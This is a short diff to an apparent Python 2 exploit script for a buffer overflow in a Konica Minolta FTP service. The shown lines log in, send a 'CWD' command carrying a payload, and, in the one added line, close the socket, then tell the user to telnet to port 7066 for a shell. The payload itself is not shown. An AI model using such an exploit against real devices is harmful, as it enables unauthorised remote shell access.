@@ -98,4 +98,5 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     s.send("PASS " + self.passwd[0])
     s.recv(1024)
     s.send("CWD " + payload)
+    s.close()
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
